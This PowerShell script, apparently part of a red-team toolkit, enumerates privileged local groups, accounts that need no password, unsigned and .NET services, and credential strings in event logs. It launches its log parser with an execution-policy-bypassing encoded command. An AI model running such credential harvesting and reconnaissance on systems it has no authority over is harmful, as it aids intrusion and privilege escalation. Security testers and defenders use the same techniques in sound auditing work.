function Get-LocalAdministrators {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-544'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {try{[wmi]$_.PartComponent}catch{}} 
    return $list 
}
function Get-LocalPSRemote {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-580'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {try{[wmi]$_.PartComponent}catch{}} 
    return $list 
}
function Get-LocalRDP {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-555'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {try{[wmi]$_.PartComponent}catch{}} 
    return $list 
}
function Get-LocalDCOM {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-562'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {try{[wmi]$_.PartComponent}catch{}} 
    return $list 
}
function Get-LocalPasswordNotRequired {
    return (Get-WmiObject -Class Win32_UserAccount -Filter  "LocalAccount='True' AND PasswordRequired='False'")
}
function Invoke-EventLogParser {
    param()
    $scriptblock=@'
    $eventlogparser=@"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics.Eventing.Reader;
using System.Text.RegularExpressions;
using System.Security.AccessControl;
using System.Security.Principal;
using System.IO;

namespace EventLogParser
{
    public class EventLogHelpers
    {

        #region Static Variable Definitions

        static string[] powershellLogs = { "Microsoft-Windows-PowerShell/Operational", "Windows PowerShell" };
        public static Dictionary<string, Delegate> supportedEventIds = new Dictionary<string, Delegate>()
        {
            { "4104", new Action<string, string>(Parse4104Events) },
            { "4103", new Action(Parse4103Events) },
            { "4688", new Action(Parse4688Events) },
        };

        #endregion

        #region Regex Definitions

        static Regex[] powershellRegex =
        {
            new Regex(@"(New-Object.*System.Management.Automation.PSCredential.*)", RegexOptions.IgnoreCase & RegexOptions.Multiline), //ignore me
            new Regex(@"(net(.exe)? user.*)", RegexOptions.IgnoreCase & RegexOptions.Multiline), //ignore me
            new Regex(@"(ConvertTo-SecureString.*AsPlainText.*)", RegexOptions.IgnoreCase & RegexOptions.Multiline), //ignore me
            new Regex(@"(cmdkey(.exe)?.*/pass:.*)", RegexOptions.IgnoreCase & RegexOptions.Multiline), //ignore me
            new Regex(@"(ssh(.exe)?.*-i .*)", RegexOptions.IgnoreCase & RegexOptions.Multiline) //ignore me
        }; //ignore me

        static Regex[] processCmdLineRegex =
        {
            new Regex(@"(net(.exe)? user.*)", RegexOptions.IgnoreCase), //ignore me
            new Regex(@"(cmdkey(.exe)?.*/pass:.*)", RegexOptions.IgnoreCase), //ignore me
            new Regex(@"(ssh(.exe)?.*-i .*)", RegexOptions.IgnoreCase) //ignore me
        }; //ignore me
        #endregion

        #region Helper Functions

        static EventLogQuery GetEventLog(string logName, int eventId, PathType pathType = PathType.LogName)
        {
            string query = String.Format("*[System/EventID={0}]", eventId);
            EventLogQuery eventLogQuery = new EventLogQuery(logName, pathType, query);
            eventLogQuery.ReverseDirection = true;
            return eventLogQuery;
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        #endregion

        #region Event Log Parsing Functions

        public static void Parse4104Events(string outFile = "", string context = "")
        {
            if (context != "")
            {
                int result = 0;
                int.TryParse(context, out result);
                if (result == 0)
                {
                    Console.WriteLine("[X] Error: Could not parse context given: {0}", context);
                    Console.WriteLine("[X] Exiting.");
                    Environment.Exit(1);
                }
                Parse4104Events(outFile, int.Parse(context));
            }
            Parse4104Events(outFile, int.Parse(context));
        }

        public static void Parse4104Events(string outFile = "", int context = 3)
        {
            // Properties[2] contains the scriptblock
            int eventId = 4104;
            Console.WriteLine("[*] Parsing PowerShell {0} event logs...", eventId);
            System.IO.StreamWriter streamWriter = null;
            if (outFile != "")
            {
                try
                {
                    streamWriter = new System.IO.StreamWriter(outFile);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Error: Could not open {0} for writing.", outFile);
                    Console.WriteLine("[X] Reason: {0}", ex.Message);
                }
            }
            foreach (string logName in powershellLogs)
            {
                EventLogQuery eventLogQuery = GetEventLog(logName, eventId);
                EventLogReader logReader = new EventLogReader(eventLogQuery);
                for (EventRecord eventdetail = logReader.ReadEvent(); eventdetail != null; eventdetail = logReader.ReadEvent())
                {
                    string scriptBlock = eventdetail.Properties[2].Value.ToString();
                    foreach (Regex reg in powershellRegex)
                    {
                        Match m = reg.Match(scriptBlock);
                        if (m.Success)
                        {
                            Regex regskip = new Regex(@".*//ignore me.*", RegexOptions.IgnoreCase);
                            bool ignore = regskip.IsMatch(scriptBlock);
                            if (!ignore)
                            {
                                Console.WriteLine();
                                Console.WriteLine("[+] Regex Match: {0}", m.Value);
                                if (streamWriter != null)
                                {
                                    streamWriter.WriteLine(scriptBlock);
                                }
                                string[] scriptBlockParts = scriptBlock.Split('\n');
                                for (int i = 0; i < scriptBlockParts.Length; i++)
                                {
                                    if (scriptBlockParts[i].Contains(m.Value))
                                    {
                                        Console.WriteLine("[+] Regex Context:");
                                        int printed = 0;
                                        for (int j = 1; i - j > 0 && printed < context; j++)
                                        {
                                            if (scriptBlockParts[i - j].Trim() != "")
                                            {
                                                Console.WriteLine("\t{0}", scriptBlockParts[i - j].Trim());
                                                printed++;
                                            }
                                        }
                                        printed = 0;
                                        Console.WriteLine("\t{0}", m.Value.Trim());
                                        for (int j = 1; printed < context && i + j < scriptBlockParts.Length; j++)
                                        {
                                            if (scriptBlockParts[i + j].Trim() != "")
                                            {
                                                Console.WriteLine("\t{0}", scriptBlockParts[i + j].Trim());
                                                printed++;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // Cleanup
            if (streamWriter != null)
            {
                streamWriter.Close();
                Console.WriteLine("[*] Wrote all script blocks to {0}", outFile);
            }
        }

        public static void Parse4103Events()
        {
            int eventId = 4103;
            char[] separator = { '=' };
            Dictionary<string, HashSet<string>> results = new Dictionary<string, HashSet<string>>();
            Console.WriteLine("[*] Parsing PowerShell {0} event logs...", eventId);
            foreach (string logName in powershellLogs)
            {
                EventLogQuery eventLogQuery = GetEventLog(logName, eventId);
                EventLogReader logReader = new EventLogReader(eventLogQuery);
                for (EventRecord eventdetail = logReader.ReadEvent(); eventdetail != null; eventdetail = logReader.ReadEvent())
                {
                    string[] eventAttributeLines = eventdetail.Properties[0].Value.ToString().Split('\n');
                    string username = "";
                    string scriptName = "";
                    foreach (string attr in eventAttributeLines)
                    {
                        if (attr.Contains("Script Name ="))
                        {
                            scriptName = attr.Split(separator, 2)[1].Trim();
                        }
                        else if (attr.Contains("User =") && !attr.Contains("Connected User ="))
                        {
                            username = attr.Split(separator, 2)[1].Trim();
                        }
                        if (username != "" && scriptName != "")
                        {
                            break;
                        }
                    }
                    if (!results.ContainsKey(username))
                    {
                        results[username] = new HashSet<string>();
                    }
                    results[username].Add(scriptName);
                }
            }
            foreach (string username in results.Keys)
            {
                if (results[username].Count > 0)
                {
                    Console.WriteLine("[+] {0} loaded modules:", username);
                    foreach (string script in results[username])
                    {
                        Console.WriteLine("\t{0}", script);
                    }
                }
            }
        }

        public static void Parse4688Events()
        {
            if (!IsHighIntegrity())
            {
                Console.WriteLine("[X] Error: To parse 4688 Event Logs, you need to be in high integrity.");
                Console.WriteLine("[X] Exiting.");
                Environment.Exit(1);
            }
            int eventId = 4688;
            Console.WriteLine("[*] Parsing {0} Process Creation event logs...", eventId);
            string logName = "Security";
            HashSet<string> results = new HashSet<string>();
            EventLogQuery eventLogQuery = GetEventLog(logName, eventId);
            EventLogReader logReader = new EventLogReader(eventLogQuery);
            for (EventRecord eventdetail = logReader.ReadEvent(); eventdetail != null; eventdetail = logReader.ReadEvent())
            {
                // Properties[8]
                string commandLine = eventdetail.Properties[8].Value.ToString().Trim();
                if (commandLine != "")
                {
                    Console.WriteLine(commandLine);
                    foreach (Regex reg in processCmdLineRegex)
                    {
                        Match m = reg.Match(commandLine);
                        if (m.Success)
                        {
                            results.Add(commandLine);
                        }
                    }
                }
            }
            foreach (string cmd in results)
            {
                Console.WriteLine("[+] {0}", cmd);
            }
        }

        #endregion
    }
}
"@
    Add-Type -TypeDefinition $eventlogparser -Language CSharp
    [EventLogParser.EventLogHelpers]::Parse4103Events()
    [EventLogParser.EventLogHelpers]::Parse4104Events($null,3)
    [EventLogParser.EventLogHelpers]::Parse4688Events()
'@
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptblock))
    $resp = powershell -nop -exe bypass -enc $enc
    return $resp
}
function Get-NonstandardService {
    <#
    .SYNOPSIS
    Modified version

    Returns services where the associated binaries are either not signed, or are
    signed by an issuer not matching 'Microsoft'.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    #>
    [CmdletBinding()]
    Param()

    function CloneObject($Object) {
        $NewObj = New-Object PsObject
        $Object.psobject.Properties | ForEach-Object { Add-Member -MemberType NoteProperty -InputObject $NewObj -Name $_.Name -Value $_.Value }
        $NewObj
    }

    function Get-BinaryBasePath {

        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
            [Alias('PathName', 'FilePath')]
            [String]
            $Path
        )

        if ($Path -and ($Path -match '^\W*(?<ServicePath>[a-z]:\\.+?(\.exe|\.dll|\.sys))\W*')) {
            $Matches['ServicePath']
        }
        else {
            Write-output "Regex failed for the following path: $Path"
        }
    }

    function Get-PEMetaData {

        [CmdletBinding()]
        param($Path)

        try {
            $FullPath = Resolve-Path -Path $Path -ErrorAction Stop
            try {
                $Null = [Reflection.AssemblyName]::GetAssemblyName($FullPath)
                $IsDotNet = $True
            }
            catch {
                $IsDotNet = $False
            }

            $Signature = Get-AuthenticodeSignature -FilePath $FullPath -ErrorAction SilentlyContinue
            if ($Signature -and ($Signature.Status -eq 'NotSigned')) {
                $Signed = $False
                $Issuer = $Null
            }
            else {
                $Signed = $True
                $Issuer = $Signature.SignerCertificate.Issuer
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'Path' $FullPath
            $Out | Add-Member Noteproperty 'Signed' $Signed
            $Out | Add-Member Noteproperty 'Issuer' $Issuer
            $Out | Add-Member Noteproperty 'IsDotNet' $IsDotNet
            $Out
        }
        catch {
            Write-Output "Unable to resolve path: $Path"
        }
    }
    $h=@()
    $MetadataCache = @{}
    Get-WmiObject -Class win32_Service -Property Name,PathName,StartMode,State,ProcessID | Where-Object { $_.PathName } | ForEach-Object {
        try{
            $BasePath = Get-BinaryBasePath -Path $_.PathName 
            $ServiceName = $_.Name
        }catch{}

        Write-Verbose "[Get-NonstandardService] Service $ServiceName : $BasePath"

        if ($MetadataCache[$BasePath]) {
            $Metadata = $MetadataCache[$BasePath]
        }
        else {
            try{
                $Metadata = Get-PEMetaData -Path $BasePath
                $MetadataCache[$BasePath] = $Metadata
            }catch{}
        }
        if($Metadata){
            $ObjectMetadata = CloneObject $Metadata
            $ObjectMetadata | Add-Member Noteproperty 'Name' $ServiceName
            $ObjectMetadata | Add-Member Noteproperty 'PathName' $_.PathName
            $ObjectMetadata | Add-Member Noteproperty 'StartMode' $_.StartMode
            $ObjectMetadata | Add-Member Noteproperty 'State' $_.State
            $ObjectMetadata | Add-Member Noteproperty 'ProcessID' $_.ProcessID
            $h += $ObjectMetadata | Where-Object {(-not $_.Signed) -or ($_.Issuer -notmatch 'Microsoft')}
        }
    }
    return $h
}
function Get-DotNetServices {
    <#
    https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-DotNetServices.ps1
    .SYNOPSIS
        Enumerates services written in .NET

        Author: Lee Christensen (@tifkin_)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        
    .DESCRIPTION
        This function enumerates all services on the machine and then checks
        to see if the service is written in a .NET language.  Useful for 
        enumerating services that can be easily reverse engineered (e.g. for
        vulnerability analysis). Ideal candidates for reversing will have a 
        StartMode of "Auto", have a State of "Running", or have an ETW
        trigger (sc.exe qtriggerinfo <service name>).  
    
    #>


    function New-InMemoryModule
    {
    <#
    .SYNOPSIS

    Creates an in-memory assembly and module

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
    .DESCRIPTION

    When defining custom enums, structs, and unmanaged functions, it is
    necessary to associate to an assembly module. This helper function
    creates an in-memory module that can be passed to the 'enum',
    'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

    Specifies the desired name for the in-memory assembly and module. If
    ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

    $Module = New-InMemoryModule -ModuleName Win32
    #>

        Param
        (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )

        $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }

        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = [AppDomain]::CurrentDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

        return $ModuleBuilder
    }


    # A helper function used to reduce typing while defining function
    # prototypes for Add-Win32Type.
    function func
    {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $DllName,

            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $FunctionName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $ReturnType,

            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,

            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,

            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,

            [String]
            $EntryPoint,

            [Switch]
            $SetLastError
        )

        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }

        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
        if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

        New-Object PSObject -Property $Properties
    }


    function Add-Win32Type
    {
    <#
    .SYNOPSIS

    Creates a .NET type for an unmanaged Win32 function.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: func
 
    .DESCRIPTION

    Add-Win32Type enables you to easily interact with unmanaged (i.e.
    Win32 unmanaged) functions in PowerShell. After providing
    Add-Win32Type with a function signature, a .NET type is created
    using reflection (i.e. csc.exe is never called like with Add-Type).

    The 'func' helper function can be used to reduce typing when defining
    multiple function definitions.

    .PARAMETER DllName

    The name of the DLL.

    .PARAMETER FunctionName

    The name of the target function.

    .PARAMETER EntryPoint

    The DLL export function name. This argument should be specified if the
    specified function name is different than the name of the exported
    function.

    .PARAMETER ReturnType

    The return type of the function.

    .PARAMETER ParameterTypes

    The function parameters.

    .PARAMETER NativeCallingConvention

    Specifies the native calling convention of the function. Defaults to
    stdcall.

    .PARAMETER Charset

    If you need to explicitly call an 'A' or 'W' Win32 function, you can
    specify the character set.

    .PARAMETER SetLastError

    Indicates whether the callee calls the SetLastError Win32 API
    function before returning from the attributed method.

    .PARAMETER Module

    The in-memory module that will host the functions. Use
    New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

    An optional namespace to prepend to the type. Add-Win32Type defaults
    to a namespace consisting only of the name of the DLL.

    .EXAMPLE

    $Mod = New-InMemoryModule -ModuleName Win32

    $FunctionDefinitions = @(
      (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
      (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
      (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    $Ntdll = $Types['ntdll']
    $Ntdll::RtlGetCurrentPeb()
    $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
    $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

    Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

    When defining multiple function prototypes, it is ideal to provide
    Add-Win32Type with an array of function signatures. That way, they
    are all incorporated into the same in-memory module.
    #>

        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $DllName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $FunctionName,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [String]
            $EntryPoint,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Type]
            $ReturnType,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Type[]]
            $ParameterTypes,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Switch]
            $SetLastError,

            [Parameter(Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )

        BEGIN
        {
            $TypeHash = @{}
        }

        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }

                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)

                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        [void] $Method.DefineParameter($i, 'Out', $null)
                    }

                    $i++
                }

                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                $EntryPointField = $DllImport.GetField('EntryPoint')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

                if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                    $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @($SetLastErrorField,
                                               $CallingConventionField,
                                               $CharsetField,
                                               $EntryPointField),
                    [Object[]] @($SLEValue,
                                 ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                                 ([Runtime.InteropServices.CharSet] $Charset),
                                 $ExportedFuncName))

                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }

        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }

            $ReturnTypes = @{}

            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
            
                $ReturnTypes[$Key] = $Type
            }

            return $ReturnTypes
        }
    }


    function psenum
    {
    <#
    .SYNOPSIS

    Creates an in-memory enumeration for use in your PowerShell session.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
    .DESCRIPTION

    The 'psenum' function facilitates the creation of enums entirely in
    memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

    The in-memory module that will host the enum. Use
    New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

    The fully-qualified name of the enum.

    .PARAMETER Type

    The type of each enum element.

    .PARAMETER EnumElements

    A hashtable of enum elements.

    .PARAMETER Bitfield

    Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

    $Mod = New-InMemoryModule -ModuleName Win32

    $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
        UNKNOWN =                  0
        NATIVE =                   1 # Image doesn't require a subsystem.
        WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
        WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
        OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
        POSIX_CUI =                7 # Image runs in the Posix character subsystem.
        NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
        WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
        EFI_APPLICATION =          10
        EFI_BOOT_SERVICE_DRIVER =  11
        EFI_RUNTIME_DRIVER =       12
        EFI_ROM =                  13
        XBOX =                     14
        WINDOWS_BOOT_APPLICATION = 16
    }

    .NOTES

    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Enum. :P
    #>

        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $Type,

            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $EnumElements,

            [Switch]
            $Bitfield
        )

        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }

        $EnumType = $Type -as [Type]

        $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

        if ($Bitfield)
        {
            $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
            $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
            $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        }

        foreach ($Key in $EnumElements.Keys)
        {
            # Apply the specified enum type to each element
            $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
        }

        $EnumBuilder.CreateType()
    }


    # A helper function used to reduce typing while defining struct
    # fields.
    function field
    {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [UInt16]
            $Position,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [Type]
            $Type,
        
            [Parameter(Position = 2)]
            [UInt16]
            $Offset,
        
            [Object[]]
            $MarshalAs
        )

        @{
            Position = $Position
            Type = $Type -as [Type]
            Offset = $Offset
            MarshalAs = $MarshalAs
        }
    }


    function struct
    {
    <#
    .SYNOPSIS

    Creates an in-memory struct for use in your PowerShell session.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: field
 
    .DESCRIPTION

    The 'struct' function facilitates the creation of structs entirely in
    memory using as close to a "C style" as PowerShell will allow. Struct
    fields are specified using a hashtable where each field of the struct
    is comprosed of the order in which it should be defined, its .NET
    type, and optionally, its offset and special marshaling attributes.

    One of the features of 'struct' is that after your struct is defined,
    it will come with a built-in GetSize method as well as an explicit
    converter so that you can easily cast an IntPtr to the struct without
    relying upon calling SizeOf and/or PtrToStructure in the Marshal
    class.

    .PARAMETER Module

    The in-memory module that will host the struct. Use
    New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

    The fully-qualified name of the struct.

    .PARAMETER StructFields

    A hashtable of fields. Use the 'field' helper function to ease
    defining each field.

    .PARAMETER PackingSize

    Specifies the memory alignment of fields.

    .PARAMETER ExplicitLayout

    Indicates that an explicit offset for each field will be specified.

    .EXAMPLE

    $Mod = New-InMemoryModule -ModuleName Win32

    $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
        DOS_SIGNATURE =    0x5A4D
        OS2_SIGNATURE =    0x454E
        OS2_SIGNATURE_LE = 0x454C
        VXD_SIGNATURE =    0x454C
    }

    $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
        e_magic =    field 0 $ImageDosSignature
        e_cblp =     field 1 UInt16
        e_cp =       field 2 UInt16
        e_crlc =     field 3 UInt16
        e_cparhdr =  field 4 UInt16
        e_minalloc = field 5 UInt16
        e_maxalloc = field 6 UInt16
        e_ss =       field 7 UInt16
        e_sp =       field 8 UInt16
        e_csum =     field 9 UInt16
        e_ip =       field 10 UInt16
        e_cs =       field 11 UInt16
        e_lfarlc =   field 12 UInt16
        e_ovno =     field 13 UInt16
        e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
        e_oemid =    field 15 UInt16
        e_oeminfo =  field 16 UInt16
        e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
        e_lfanew =   field 18 Int32
    }

    # Example of using an explicit layout in order to create a union.
    $TestUnion = struct $Mod TestUnion @{
        field1 = field 0 UInt32 0
        field2 = field 1 IntPtr 0
    } -ExplicitLayout

    .NOTES

    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Struct. :P
    #>

        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [Parameter(Position = 2, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,

            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $StructFields,

            [Reflection.Emit.PackingSize]
            $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

            [Switch]
            $ExplicitLayout
        )

        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }

        [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
            Class,
            Public,
            Sealed,
            BeforeFieldInit'

        if ($ExplicitLayout)
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
        }
        else
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
        }

        $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        $Fields = New-Object Hashtable[]($StructFields.Count)

        # Sort each field according to the orders specified
        # Unfortunately, PSv2 doesn't have the luxury of the
        # hashtable [Ordered] accelerator.
        foreach ($Field in $StructFields.Keys)
        {
            $Index = $StructFields[$Field]['Position']
            $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
        }

        foreach ($Field in $Fields)
        {
            $FieldName = $Field['FieldName']
            $FieldProp = $Field['Properties']

            $Offset = $FieldProp['Offset']
            $Type = $FieldProp['Type']
            $MarshalAs = $FieldProp['MarshalAs']

            $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

            if ($MarshalAs)
            {
                $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
                if ($MarshalAs[1])
                {
                    $Size = $MarshalAs[1]
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                        $UnmanagedType, $SizeConst, @($Size))
                }
                else
                {
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                }
            
                $NewField.SetCustomAttribute($AttribBuilder)
            }

            if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
        }

        # Make the struct aware of its own size.
        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
        $SizeMethod = $StructBuilder.DefineMethod('GetSize',
            'Public, Static',
            [Int],
            [Type[]] @())
        $ILGenerator = $SizeMethod.GetILGenerator()
        # Thanks for the help, Jason Shirk!
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
